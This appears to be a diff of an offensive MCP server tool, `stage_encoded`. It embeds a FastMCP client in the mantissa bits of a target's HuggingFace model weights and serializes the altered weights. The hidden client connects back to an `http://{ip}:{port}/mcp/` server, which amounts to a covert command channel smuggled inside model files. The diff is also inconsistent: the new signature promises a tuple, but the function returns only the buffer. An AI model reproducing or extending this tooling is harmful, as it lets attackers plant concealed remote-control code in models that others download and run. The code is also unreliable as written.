@@ -710,17 +710,17 @@ def get_conversation_history(user_command: str, session_context: Middleware, ses
     return hist_message
 
 @MCP_SERVER.tool()
-def stage_encoded(model_id: str, target_key: str, num_lsb: int, server: FastMCP = CurrentFastMCP()) -> AutoModel:
+def stage_encoded(model_id: str, target_key: str, num_lsb: int, server: FastMCP = CurrentFastMCP()) -> Tuple[io.BytesIO, AutoConfig]:
     """
     Encodes the FastMCP client in the mantissa bits of the weights of a given HuggingFace base model.
 
     Args:
-        model_id (str): HF hub model ID or path to local model to hide the MCP client in
+        model_id (str): HF hub model ID or path to local model on the target to hide the MCP client in
         target_key (str): Key (i.e. "large_layer.weight") in the model weights containing the target tensor
         num_lsb (int): Number of mantissa bits to modify
 
     Returns:
-        transformers.AutoModel: modified model with the FastMCP client embedded in the mantissa bits
+        Tuple[io.BytesIO, transformers.AutoConfig]: Tuple of a BytesIO object containing the modified weights and the configuration to allow a `transformers.AutoModel` to be created from such
     """
 
     # This is custom middleware I wrote myself which is added automatically by the system_prompt() initializer function, so should never be None
@@ -879,7 +879,13 @@ client = Client("http://{ip}:{port}/mcp/", sampling_handler=handler)
         modified_config = copy.deepcopy(base_config)
         modified_config.state_dict = modified_state_dict
 
-        return AutoModel.from_config(modified_config)
+        modified_model = AutoModel.from_config(modified_config)
+        buffer = io.BytesIO()
+
+        torch.save(modified_model.state_dict(), buffer)
+
+        buffer.seek(0)
+        return buffer
     except Exception as e:
         print(f"Error during encoding or state dict modification: {e}")
         raise  # Re-raise the exception
